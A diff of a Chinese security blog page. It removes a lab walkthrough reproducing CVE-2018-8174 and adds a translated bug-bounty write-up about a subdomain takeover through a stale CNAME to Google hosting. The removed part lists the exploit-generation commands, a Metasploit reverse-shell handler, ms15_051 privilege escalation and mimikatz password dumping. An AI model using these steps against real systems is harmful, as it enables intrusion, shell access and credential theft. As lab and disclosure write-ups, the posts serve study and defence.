@@ -15,21 +15,25 @@
 
 
 
-<meta name="description" content="0x00. 序言&amp;emsp;&amp;emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使">
+<meta name="description" content="原文：Taking over Google calendar of a company漏洞：CNAME记录没删导致子域名被劫持作者：Daniel V难度：中">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2018-8174 漏洞复现">
-<meta property="og:url" content="http://TimeS0ng.github.io/2018/06/27/CVE-2018-8174-漏洞复现/index.html">
+<meta property="og:title" content="第二十二篇：子域名劫持">
+<meta property="og:url" content="http://TimeS0ng.github.io/2019/03/29/第二十二篇：子域名劫持/index.html">
 <meta property="og:site_name" content="TimeS0ng&#39;s blog">
-<meta property="og:description" content="0x00. 序言&amp;emsp;&amp;emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使">
+<meta property="og:description" content="原文：Taking over Google calendar of a company漏洞：CNAME记录没删导致子域名被劫持作者：Daniel V难度：中">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212802_F7I75O_Screenshot.jpeg">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627211559_Tkq5fo_Screenshot.jpeg">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212029_bxawG8_Screenshot.jpeg">
-<meta property="og:updated_time" content="2019-01-25T01:15:34.091Z">
+<meta property="og:image" content="http://tu.027cgb.com/612577/times0ng_blog/translate_22/1.png">
+<meta property="og:image" content="http://tu.027cgb.com/612577/times0ng_blog/translate_22/2.png">
+<meta property="og:image" content="http://tu.027cgb.com/612577/times0ng_blog/translate_22/3.png">
+<meta property="og:image" content="http://tu.027cgb.com/612577/times0ng_blog/translate_22/4.png">
+<meta property="og:image" content="http://tu.027cgb.com/612577/times0ng_blog/translate_22/5.png">
+<meta property="og:image" content="http://tu.027cgb.com/612577/times0ng_blog/translate_22/6.png">
+<meta property="og:image" content="http://tu.027cgb.com/612577/times0ng_blog/translate_22/7.png">
+<meta property="og:updated_time" content="2019-03-29T03:19:39.334Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CVE-2018-8174 漏洞复现">
-<meta name="twitter:description" content="0x00. 序言&amp;emsp;&amp;emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使">
-<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212802_F7I75O_Screenshot.jpeg">
+<meta name="twitter:title" content="第二十二篇：子域名劫持">
+<meta name="twitter:description" content="原文：Taking over Google calendar of a company漏洞：CNAME记录没删导致子域名被劫持作者：Daniel V难度：中">
+<meta name="twitter:image" content="http://tu.027cgb.com/612577/times0ng_blog/translate_22/1.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -61,7 +65,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>CVE-2018-8174 漏洞复现 | TimeS0ng&#39;s blog</title>
+<title>第二十二篇：子域名劫持 | TimeS0ng&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -258,20 +262,20 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-CVE-2018-8174-漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-第二十二篇：子域名劫持" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/06/27/CVE-2018-8174-漏洞复现/" class="article-date">
-      <time datetime="2018-06-27T13:24:22.000Z" itemprop="datePublished">2018-06-27</time>
+      <a href="/2019/03/29/第二十二篇：子域名劫持/" class="article-date">
+      <time datetime="2019-03-29T02:48:45.000Z" itemprop="datePublished">2019-03-29</time>
 </a>
 
  
-    <a href="/2018/06/27/CVE-2018-8174-漏洞复现/#comments" title="查看评论">
+    <a href="/2019/03/29/第二十二篇：子域名劫持/#comments" title="查看评论">
         <i class="fa fa-comments-o" aria-hidden="true"></i>
         <span class="count-comment"></span>
         
         
-            <span class="disqus-comment-count" data-disqus-identifier="2018/06/27/CVE-2018-8174-漏洞复现/"></span>
+            <span class="disqus-comment-count" data-disqus-identifier="2019/03/29/第二十二篇：子域名劫持/"></span>
         
     </a>
 
@@ -286,7 +290,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      CVE-2018-8174 漏洞复现
+      第二十二篇：子域名劫持
     </h1>
   
 
@@ -303,14 +307,15 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。"><a href="#emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。" class="headerlink" title="&emsp;&emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。"></a>&emsp;&emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。</h4><a id="more"></a>
-<h2 id="0x01-操作演示"><a href="#0x01-操作演示" class="headerlink" title="0x01. 操作演示"></a>0x01. 操作演示</h2><h4 id="1-下载EXP到kali-，生成木马文件，启动msf监听"><a href="#1-下载EXP到kali-，生成木马文件，启动msf监听" class="headerlink" title="1. 下载EXP到kali ，生成木马文件，启动msf监听"></a>1. 下载EXP到kali ，生成木马文件，启动msf监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/iBearcat/CVE-2018-8174_EXP.git</div><div class="line">cd CVE-2018-8174_EXP/</div><div class="line">python CVE-2018-8174.py -u http://192.168.1.111/exploit.html -o exploit.rtf -i 192.168.1.111 -p 4444</div><div class="line">cp exploit.html /var/www/html/</div><div class="line">service apache2 start</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">msfconsole</div><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/shell/reverse_tcp</div><div class="line">set lhost 192.168.1.111</div><div class="line">set lport 4444</div><div class="line">run</div></pre></td></tr></table></figure>
-<h4 id="2-靶机访问-http-192-168-1-111-exploit-html"><a href="#2-靶机访问-http-192-168-1-111-exploit-html" class="headerlink" title="2. 靶机访问 http://192.168.1.111/exploit.html"></a>2. 靶机访问 <a href="http://192.168.1.111/exploit.html" target="_blank" rel="external">http://192.168.1.111/exploit.html</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212802_F7I75O_Screenshot.jpeg" alt=""></p>
-<h4 id="3-先将-shell-转换为-meterpreter-，再利用ms15-051提权"><a href="#3-先将-shell-转换为-meterpreter-，再利用ms15-051提权" class="headerlink" title="3. 先将 shell 转换为 meterpreter ，再利用ms15_051提权"></a>3. 先将 shell 转换为 meterpreter ，再利用ms15_051提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sessions -u 2</div><div class="line">use windows/local/ms15_051_client_copy_image</div><div class="line">set session 3</div><div class="line">run</div></pre></td></tr></table></figure>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627211559_Tkq5fo_Screenshot.jpeg" alt=""></p>
-<h4 id="4-利用mimikatz-盗取明文密码"><a href="#4-利用mimikatz-盗取明文密码" class="headerlink" title="4. 利用mimikatz 盗取明文密码"></a>4. 利用mimikatz 盗取明文密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">load mimikatz</div><div class="line">msv</div><div class="line">kerberos</div></pre></td></tr></table></figure>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212029_bxawG8_Screenshot.jpeg" alt=""></p>
+        <h4 id="原文：Taking-over-Google-calendar-of-a-company"><a href="#原文：Taking-over-Google-calendar-of-a-company" class="headerlink" title="原文：Taking over Google calendar of a company"></a>原文：<a href="https://medium.com/bugbountywriteup/taking-over-google-calendar-of-a-company-1c49071f6a9" target="_blank" rel="external"><strong>Taking over Google calendar of a company</strong></a></h4><h4 id="漏洞：CNAME记录没删导致子域名被劫持"><a href="#漏洞：CNAME记录没删导致子域名被劫持" class="headerlink" title="漏洞：CNAME记录没删导致子域名被劫持"></a>漏洞：CNAME记录没删导致子域名被劫持</h4><h4 id="作者：Daniel-V"><a href="#作者：Daniel-V" class="headerlink" title="作者：Daniel V"></a>作者：<a href="https://medium.com/@danielV." target="_blank" rel="external">Daniel V</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
+<h2 id="大家好！"><a href="#大家好！" class="headerlink" title="大家好！"></a>大家好！</h2><h4 id="这次我将展示我在一家拥有30-000名客户的公司中发现的子域名劫持漏洞！"><a href="#这次我将展示我在一家拥有30-000名客户的公司中发现的子域名劫持漏洞！" class="headerlink" title="这次我将展示我在一家拥有30,000名客户的公司中发现的子域名劫持漏洞！"></a>这次我将展示我在一家拥有30,000名客户的公司中发现的子域名劫持漏洞！</h4><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><h4 id="列出所有的子域名是信息收集阶段最耗时的部分，所以我使用工具”Aquatone”来协助我"><a href="#列出所有的子域名是信息收集阶段最耗时的部分，所以我使用工具”Aquatone”来协助我" class="headerlink" title="列出所有的子域名是信息收集阶段最耗时的部分，所以我使用工具”Aquatone”来协助我"></a>列出所有的子域名是信息收集阶段最耗时的部分，所以我使用工具”Aquatone”来协助我</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">aquatone-discover --domain company.com.br #爆破子域名</div><div class="line">aquatone-takeover --domain company.com.br #发现可劫持的子域名</div></pre></td></tr></table></figure>
+<p><img src="http://tu.027cgb.com/612577/times0ng_blog/translate_22/1.png" alt=""></p>
+<h4 id="结果显示，其中一个子域”calendar-company-com-br”的CNAME记录指向”gas-googlehosted-com”，当我尝试访问时出现下列错误信息："><a href="#结果显示，其中一个子域”calendar-company-com-br”的CNAME记录指向”gas-googlehosted-com”，当我尝试访问时出现下列错误信息：" class="headerlink" title="结果显示，其中一个子域”calendar.company.com.br”的CNAME记录指向”gas.googlehosted.com”，当我尝试访问时出现下列错误信息："></a>结果显示，其中一个子域”calendar.company.com.br”的CNAME记录指向”gas.googlehosted.com”，当我尝试访问时出现下列错误信息：</h4><p><img src="http://tu.027cgb.com/612577/times0ng_blog/translate_22/2.png" alt=""></p>
+<h4 id="我使用mxtoolbox确认CNAME的关联关系"><a href="#我使用mxtoolbox确认CNAME的关联关系" class="headerlink" title="我使用mxtoolbox确认CNAME的关联关系"></a>我使用mxtoolbox确认CNAME的关联关系</h4><p><img src="http://tu.027cgb.com/612577/times0ng_blog/translate_22/3.png" alt=""></p>
+<h4 id="我创建了一个新的Gsuite账号，并将我的公司域名指定为”calendar-company-com-br”"><a href="#我创建了一个新的Gsuite账号，并将我的公司域名指定为”calendar-company-com-br”" class="headerlink" title="我创建了一个新的Gsuite账号，并将我的公司域名指定为”calendar.company.com.br”"></a>我创建了一个新的Gsuite账号，并将我的公司域名指定为”calendar.company.com.br”</h4><p><img src="http://tu.027cgb.com/612577/times0ng_blog/translate_22/4.png" alt=""></p>
+<p><img src="http://tu.027cgb.com/612577/times0ng_blog/translate_22/5.png" alt=""></p>
+<p><img src="http://tu.027cgb.com/612577/times0ng_blog/translate_22/6.png" alt=""></p>
+<h4 id="Next-next-next…-and-…-Done"><a href="#Next-next-next…-and-…-Done" class="headerlink" title="Next, next, next… and … Done!"></a>Next, next, next… and … Done!</h4><h4 id="我接到一封电子邮件，说该账户已成功注册："><a href="#我接到一封电子邮件，说该账户已成功注册：" class="headerlink" title="我接到一封电子邮件，说该账户已成功注册："></a>我接到一封电子邮件，说该账户已成功注册：</h4><p><img src="http://tu.027cgb.com/612577/times0ng_blog/translate_22/7.png" alt=""></p>
 
       
     </div>
@@ -319,13 +324,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/06/27/CVE-2018-8174-漏洞复现/">CVE-2018-8174 漏洞复现</a></p>
+        <p><span>本文标题:</span><a href="/2019/03/29/第二十二篇：子域名劫持/">第二十二篇：子域名劫持</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
-        <p><span>发布时间:</span>2018-06-27, 21:24:22</p>
-        <p><span>最后更新:</span>2019-01-25, 09:15:34</p>
+        <p><span>发布时间:</span>2019-03-29, 10:48:45</p>
+        <p><span>最后更新:</span>2019-03-29, 11:19:39</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/06/27/CVE-2018-8174-漏洞复现/" title="CVE-2018-8174 漏洞复现">http://TimeS0ng.github.io/2018/06/27/CVE-2018-8174-漏洞复现/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/06/27/CVE-2018-8174-漏洞复现/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/03/29/第二十二篇：子域名劫持/" title="第二十二篇：子域名劫持">http://TimeS0ng.github.io/2019/03/29/第二十二篇：子域名劫持/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2019/03/29/第二十二篇：子域名劫持/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -337,16 +342,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/12/19/第一篇翻译：Change-Anyone’s-profile-picture-Exploiting-IDOR/">
-                    第一篇翻译：越权漏洞
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/06/04/SQL注入导图/">
-                    SQL注入导图
+                <a href="/2019/02/26/第二十一篇：存储型XSS（前续）/">
+                    第二十一篇：存储型XSS（前续）
                 </a>
             </div>
         
@@ -358,7 +357,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-序言"><span class="toc-number">1.</span> <span class="toc-text">0x00. 序言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。"><span class="toc-number">1.0.1.</span> <span class="toc-text">  漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-操作演示"><span class="toc-number">2.</span> <span class="toc-text">0x01. 操作演示</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-下载EXP到kali-，生成木马文件，启动msf监听"><span class="toc-number">2.0.1.</span> <span class="toc-text">1. 下载EXP到kali ，生成木马文件，启动msf监听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-靶机访问-http-192-168-1-111-exploit-html"><span class="toc-number">2.0.2.</span> <span class="toc-text">2. 靶机访问 http://192.168.1.111/exploit.html</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-先将-shell-转换为-meterpreter-，再利用ms15-051提权"><span class="toc-number">2.0.3.</span> <span class="toc-text">3. 先将 shell 转换为 meterpreter ，再利用ms15_051提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-利用mimikatz-盗取明文密码"><span class="toc-number">2.0.4.</span> <span class="toc-text">4. 利用mimikatz 盗取明文密码</span></a></li></ol></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：Taking-over-Google-calendar-of-a-company"><span class="toc-number">1.</span> <span class="toc-text">原文：Taking over Google calendar of a company</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞：CNAME记录没删导致子域名被劫持"><span class="toc-number">2.</span> <span class="toc-text">漏洞：CNAME记录没删导致子域名被劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：Daniel-V"><span class="toc-number">3.</span> <span class="toc-text">作者：Daniel V</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：中"><span class="toc-number">4.</span> <span class="toc-text">难度：中</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大家好！"><span class="toc-number"></span> <span class="toc-text">大家好！</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#这次我将展示我在一家拥有30-000名客户的公司中发现的子域名劫持漏洞！"><span class="toc-number">1.</span> <span class="toc-text">这次我将展示我在一家拥有30,000名客户的公司中发现的子域名劫持漏洞！</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集："><span class="toc-number"></span> <span class="toc-text">信息收集：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#列出所有的子域名是信息收集阶段最耗时的部分，所以我使用工具”Aquatone”来协助我"><span class="toc-number">1.</span> <span class="toc-text">列出所有的子域名是信息收集阶段最耗时的部分，所以我使用工具”Aquatone”来协助我</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#结果显示，其中一个子域”calendar-company-com-br”的CNAME记录指向”gas-googlehosted-com”，当我尝试访问时出现下列错误信息："><span class="toc-number">2.</span> <span class="toc-text">结果显示，其中一个子域”calendar.company.com.br”的CNAME记录指向”gas.googlehosted.com”，当我尝试访问时出现下列错误信息：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#我使用mxtoolbox确认CNAME的关联关系"><span class="toc-number">3.</span> <span class="toc-text">我使用mxtoolbox确认CNAME的关联关系</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#我创建了一个新的Gsuite账号，并将我的公司域名指定为”calendar-company-com-br”"><span class="toc-number">4.</span> <span class="toc-text">我创建了一个新的Gsuite账号，并将我的公司域名指定为”calendar.company.com.br”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Next-next-next…-and-…-Done"><span class="toc-number">5.</span> <span class="toc-text">Next, next, next… and … Done!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#我接到一封电子邮件，说该账户已成功注册："><span class="toc-number">6.</span> <span class="toc-text">我接到一封电子邮件，说该账户已成功注册：</span></a></li></ol>
         
     </div>
     <style>
@@ -394,7 +393,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"CVE-2018-8174 漏洞复现　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"第二十二篇：子域名劫持　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -451,15 +450,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/12/19/第一篇翻译：Change-Anyone’s-profile-picture-Exploiting-IDOR/" title="上一篇: 第一篇翻译：越权漏洞">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/06/04/SQL注入导图/" title="下一篇: SQL注入导图">
+            <a href="/2019/02/26/第二十一篇：存储型XSS（前续）/" title="下一篇: 第二十一篇：存储型XSS（前续）">
                 <i class="fa fa-angle-right"></i>
             </a>
         
